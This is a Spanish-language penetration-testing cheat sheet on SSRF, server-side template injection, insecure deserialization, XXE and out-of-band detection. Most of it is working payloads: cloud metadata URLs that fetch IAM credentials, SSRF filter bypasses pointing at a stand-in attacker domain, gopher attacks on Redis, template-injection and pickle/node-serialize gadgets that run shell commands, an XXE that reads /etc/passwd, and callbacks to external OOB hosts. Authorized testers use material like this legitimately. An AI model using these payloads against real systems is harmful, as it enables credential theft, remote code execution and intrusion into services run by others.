# SSRF / SSTI / Deserialization / OOB

## SSRF

### Detección
Cualquier param que reciba URL/host:
- `?url=`, `?image=`, `?fetch=`, `?webhook=`, `?callback=`
- Funciones: import URL, avatar URL, PDF generator, SSO redirect, OAuth callback
- Parsers: SVG, XML (XXE-via-SSRF), Markdown image render, oEmbed

### Cloud metadata endpoints

```
AWS:    http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS v2 (IMDSv2 requiere PUT token, harder to SSRF):
        TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
GCP:    http://metadata.google.internal/computeMetadata/v1/  (header Metadata-Flavor: Google)
Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01  (header Metadata: true)
DO:     http://169.254.169.254/metadata/v1/
Alibaba: http://100.100.100.200/latest/meta-data/
```

### Bypass de filtros

```
http://localhost → http://127.0.0.1 → http://[::1] → http://0.0.0.0
http://2130706433  (decimal de 127.0.0.1)
http://0x7f.0x0.0x0.0x1
http://127.1
http://localhost.atacker.cl  (DNS rebinding setup)
http://atacker.cl@127.0.0.1
http://127.0.0.1#@atacker.cl
http://127.0.0.1.nip.io
```

### SSRF tools

```bash
# SSRFmap (desde request raw)
ssrfmap -r request.txt -p url -m readfiles,portscan,aws

# interactsh (OOB callback)
interactsh-client -v
# usa el subdomain como destino: http://abc123.oast.fun/
```

### Servicios internos comunes

| Puerto | Servicio | Payload |
|--------|----------|---------|
| 6379 | Redis | `gopher://127.0.0.1:6379/_INFO` |
| 11211 | Memcached | comandos texto |
| 9200 | Elasticsearch | `/`, `/_search` |
| 27017 | MongoDB | requiere binario |
| 5984 | CouchDB | `/_all_dbs` |
| 8500 | Consul | `/v1/agent/self` |
| 8080 | Jenkins/Tomcat | `/manager/html` |

Gopher payload generator: https://github.com/tarunkant/Gopherus

## SSTI — Server-Side Template Injection

Detección rápida:
```
{{7*7}}        → 49 (Jinja2/Twig)
{{7*'7'}}      → 7777777 (Jinja2) | 49 (Twig)
${7*7}         → 49 (FreeMarker, JSP EL)
<%= 7*7 %>     → 49 (ERB Ruby)
#{7*7}         → 49 (Pug, Ruby)
```

tplmap (auto):
```bash
tplmap -u "https://target.cl/page?name=test"
```

### RCE payloads por engine

**Jinja2 (Python):**
```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

**Twig (PHP):**
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**FreeMarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**Velocity:**
```
#set($x=$rt.exec('id'))
```

## Deserialization

### Java
```bash
# ysoserial
ysoserial CommonsCollections5 'curl http://oast/' | base64

# Detecta gadget chains disponibles
ysoserial
```

Endpoints típicos: `viewstate`, `session`, RMI, JMX, ActiveMQ.

### .NET
- ysoserial.net
- ViewState (`__VIEWSTATE` con MAC roto).

### PHP
```
O:8:"stdClass":1:{s:4:"prop";s:4:"test";}
```
PHPGGC para gadget chains.

### Python
```python
import pickle, os
class P:
    def __reduce__(self): return (os.system, ('id',))
print(pickle.dumps(P()))
```

### Ruby
- `Marshal.load` con gadget chain (Universal RCE Gadget).

### Node.js
- `node-serialize` con `_$$ND_FUNC$$_`:
  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
  ```

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>
<root>&e;</root>
```

OOB:
```xml
<!DOCTYPE x [<!ENTITY % e SYSTEM "http://oast/dtd"> %e;]>
```

## Out-of-Band tracking

- Burp Collaborator (Pro)
- interactsh: `interactsh-client`
- DNS callbacks: `dnslog.cn`, `requestbin.com`

OOB es CRÍTICO para confirmar blind SSRF/SSTI/deserialization/XXE.
